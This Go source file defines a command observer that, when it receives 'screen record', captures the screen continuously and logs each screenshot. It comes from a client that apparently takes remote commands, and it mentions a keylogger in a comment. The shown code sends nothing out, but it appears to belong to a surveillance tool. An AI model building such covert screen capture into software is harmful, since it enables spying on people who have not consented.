package observer

import (
	"log"
	"marauders-map-client-desktop/internal/screen"
)

// KeyLogger commands Observer
type ScreenshotCmdObserver struct {
	recorder *screen.ScreenRecorder
}

func (o *ScreenshotCmdObserver) execute(cmd string, data []string) {
	if cmd != "screen" {
		return
	}

	// This commands needs data to operate
	if len(data) <= 0 {
		return
	}

	if data[0] == "record" {
		go func() {
			ch := make(chan *screen.Screenshot)

			o.recorder.StartCapturing(ch)

			for {
				shot := <-ch
				log.Printf("SHOT (%s)%s - %s \n", shot.FileGroup, shot.FileName, shot.FilePath)
			}
		}()
	}

	log.Println("ScreenshotCmdObserver: new action triggered")
}

func NewScreenshotCmdObserver(recorder *screen.ScreenRecorder) *ScreenshotCmdObserver {
	return &ScreenshotCmdObserver{
		recorder: recorder,
	}
}
